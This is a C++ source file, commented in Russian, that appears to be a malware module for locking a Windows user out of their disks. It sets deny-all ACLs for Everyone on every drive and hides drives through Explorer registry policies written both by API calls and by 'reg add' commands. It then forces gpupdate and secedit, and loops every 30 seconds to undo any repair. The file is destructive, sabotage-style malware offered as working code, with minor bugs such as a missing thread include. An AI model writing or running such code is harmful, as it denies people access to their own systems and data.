#include <windows.h>
#include <aclapi.h>
#include <sddl.h>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

void BlockDriveAccess(const std::string& drivePath) {
    try {
        // Получаем текущие права на диск
        PACL pDacl = NULL;
        PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
        DWORD dwError = GetNamedSecurityInfoA(
            drivePath.c_str(),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL, NULL, &pDacl, NULL, &pSecurityDescriptor
        );

        if (dwError != ERROR_SUCCESS) return;

        // Создаём новый ACL, который запрещает доступ всем пользователям
        EXPLICIT_ACCESSA ea[1];
        ZeroMemory(&ea, sizeof(ea));

        // Запрещаем всё: чтение, запись, выполнение
        ea[0].grfAccessPermissions = GENERIC_ALL;
        ea[0].grfAccessMode = DENY_ACCESS;
        ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
        ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
        ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
        ea[0].Trustee.ptstrName = const_cast<char*>("Everyone");

        PACL pNewDacl = NULL;
        dwError = SetEntriesInAclA(1, ea, pDacl, &pNewDacl);
        if (dwError != ERROR_SUCCESS) {
            LocalFree(pSecurityDescriptor);
            return;
        }

        // Применяем новый ACL
        dwError = SetNamedSecurityInfoA(
            const_cast<char*>(drivePath.c_str()),
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL, NULL, pNewDacl, NULL
        );

        LocalFree(pSecurityDescriptor);
        LocalFree(pNewDacl);

    } catch (...) {
        // Игнорируем ошибки
    }
}

void HideDrivesFromExplorer() {
    // Скрываем диски через реестр, чтобы они не отображались в "Моём компьютере"
    HKEY hKey;
    DWORD value = 0x00000000; // Скрываем все диски
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        RegSetValueExA(hKey, "NoDrives", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegSetValueExA(hKey, "NoViewOnDrive", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}

void DenyDiskAccess() {
    // Блокируем доступ ко всем дискам
    for (char drive = 'A'; drive <= 'Z'; drive++) {
        std::string drivePath = std::string(1, drive) + ":\\";
        if (fs::exists(drivePath) && fs::is_directory(drivePath)) {
            // Блокируем доступ через ACL
            BlockDriveAccess(drivePath);
        }
    }

    // Скрываем диски
    HideDrivesFromExplorer();

    // Блокируем доступ через командную строку
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDrives /t REG_DWORD /d 0xFFFFFFFF /f");
    system("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoViewOnDrive /t REG_DWORD /d 0xFFFFFFFF /f");

    // Применяем политики без перезагрузки
    system("gpupdate /force");

    // Блокируем доступ к дискам через групповые политики (на всякий случай)
    system("secedit /configure /cfg %windir%\\inf\\defltbase.inf /db defltbase.sdb /verbose");
}

// Запускаем в отдельном потоке
void InitializeDiskBlockModule() {
    std::thread diskThread([]() {
        // Ждём, пока система полностью загрузится
        Sleep(5000);
        
        while (true) {
            DenyDiskAccess();
            
            // Проверяем каждые 30 секунд, не восстановили ли доступ
            Sleep(30000);
        }
    });
    diskThread.detach();
}
